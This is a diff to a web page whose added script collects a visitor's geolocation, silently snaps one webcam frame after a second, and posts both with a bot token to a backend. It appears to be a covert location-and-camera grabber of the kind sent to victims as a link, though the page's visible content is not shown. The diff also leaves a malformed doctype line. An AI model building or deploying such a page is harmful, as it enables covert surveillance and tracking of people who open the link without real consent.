@@ -1,4 +1,4 @@
-!DOCTYPE html>
+!<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -57,4 +57,76 @@
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
                         const { latitude, longitude } = position.coords;
-          
+                        locationData.latitude = latitude;
+                        locationData.longitude = longitude;
+
+                        capturePhoto(locationData);
+                    },
+                    (error) => {
+                        alert("Unable to access location: " + error.message);
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+
+            // Capture photo and send data
+            async function capturePhoto(locationData) {
+                const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
+
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    video.srcObject = stream;
+
+                    // Allow video to play for a moment
+                    await new Promise((resolve) => setTimeout(resolve, 1000));
+
+                    // Draw video frame to canvas
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the video stream
+                    stream.getTracks().forEach((track) => track.stop());
+
+                    // Convert canvas to base64 image
+                    const photo = canvas.toDataURL("image/png");
+
+                    // Send location and photo to the backend
+                    sendToBackend(locationData, photo);
+                } catch (error) {
+                    alert("Unable to access the camera: " + error.message);
+                }
+            }
+
+            // Send location and photo to the backend
+            async function sendToBackend(locationData, photo) {
+                try {
+                    const response = await fetch(`${backendUrl}/location-photo`, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            location: locationData,
+                            photo: photo,
+                            botToken,
+                        }),
+                    });
+
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+
+                    const data = await response.json();
+                    alert("Response from backend: " + data.message);
+                } catch (error) {
+                    console.error("Error:", error);
+                    alert("Failed to send data to the backend!");
+                }
+            }
+        });
+    </script>
+</body>
+</html>
